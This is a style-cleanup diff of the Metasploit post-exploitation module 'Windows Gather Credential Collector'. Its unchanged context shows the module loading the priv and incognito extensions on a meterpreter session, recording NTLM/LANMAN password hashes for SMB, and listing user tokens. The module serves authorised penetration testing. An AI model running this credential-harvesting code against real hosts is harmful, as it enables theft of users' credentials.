@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -8,34 +9,31 @@ require 'rex'
 require 'msf/core/auxiliary/report'
 
 class MetasploitModule < Msf::Post
-
   include Msf::Auxiliary::Report
 
-  def initialize(info={})
-    super( update_info( info,
-        'Name'          => 'Windows Gather Credential Collector',
-        'Description'   => %q{ This module harvests credentials found on the host and stores them in the database.},
-        'License'       => MSF_LICENSE,
-        'Author'        => [ 'tebo[at]attackresearch.com'],
-        'Platform'      => [ 'win' ],
-        'SessionTypes'  => [ 'meterpreter']
-      ))
-
+  def initialize(info = {})
+    super(update_info(info,
+                      'Name'          => 'Windows Gather Credential Collector',
+                      'Description'   => %q( This module harvests credentials found on the host and stores them in the database.),
+                      'License'       => MSF_LICENSE,
+                      'Author'        => [ 'tebo[at]attackresearch.com'],
+                      'Platform'      => [ 'win' ],
+                      'SessionTypes'  => [ 'meterpreter']))
   end
 
   # Run Method for when run command is issued
   def run
     print_status("Running module against #{sysinfo['Computer']}")
     # Collect even without a database to store them.
-    if session.framework.db.active
-      db_ok = true
-    else
-      db_ok = false
-    end
+    db_ok = if session.framework.db.active
+              true
+            else
+              false
+            end
 
     # Make sure we're rockin Priv and Incognito
-    session.core.use("priv") if not session.priv
-    session.core.use("incognito") if not session.incognito
+    session.core.use("priv") unless session.priv
+    session.core.use("incognito") unless session.incognito
 
     # It wasn't me mom! Stinko did it!
     begin
@@ -58,14 +56,14 @@ class MetasploitModule < Msf::Post
         address: addr,
         port: 445,
         service_name: 'smb',
-        protocol: 'tcp',
+        protocol: 'tcp'
       }
 
       # Build credential information
       credential_data = {
         origin_type: :session,
         session_id: session_db_id,
-        post_reference_name: self.refname,
+        post_reference_name: refname,
         private_type: :ntlm_hash,
         private_data: hash.lanman + ":" + hash.ntlm,
         username: hash.user_name,
@@ -90,7 +88,7 @@ class MetasploitModule < Msf::Post
 
     # Record user tokens
     tokens = session.incognito.incognito_list_tokens(0)
-    raise Rex::Script::Completed if not tokens
+    raise Rex::Script::Completed unless tokens
 
     # Meh, tokens come to us as a formatted string
     print_good "Collecting tokens..."
